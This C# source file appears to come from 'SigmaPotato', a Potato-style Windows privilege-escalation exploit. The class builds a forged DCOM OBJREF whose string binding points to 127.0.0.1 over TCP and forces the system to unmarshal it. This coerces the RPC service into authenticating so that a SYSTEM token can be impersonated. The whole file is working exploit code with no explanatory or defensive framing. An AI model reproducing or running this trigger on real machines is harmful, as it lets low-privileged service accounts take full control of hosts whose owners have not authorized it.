using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace NativeAPI
{

    [ComVisible(true)]
    public class SigmaPotatoUnmarshalTrigger  {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;


        public object fakeObject = new object();
        public IntPtr pIUnknown;
        public IBindCtx bindCtx;
        public IMoniker moniker;

        private SigmaPotatoContext SigmaPotatoContext;


        public SigmaPotatoUnmarshalTrigger(SigmaPotatoContext SigmaPotatoContext) {
            this.SigmaPotatoContext = SigmaPotatoContext;


            if (!SigmaPotatoContext.IsStart)
            {
                throw new Exception("SigmaPotatoContext was not initialized");
            }

            pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            NativeMethods.CreateBindCtx(0, out bindCtx);
            NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);

        }


        public int Trigger() {

            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);

            ObjRef tmpObjRef = new ObjRef(objrefBytes);

            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();
            
            IntPtr ppv;

            return UnmarshalDCOM.UnmarshalObject(data,out ppv);
        }


    }
}
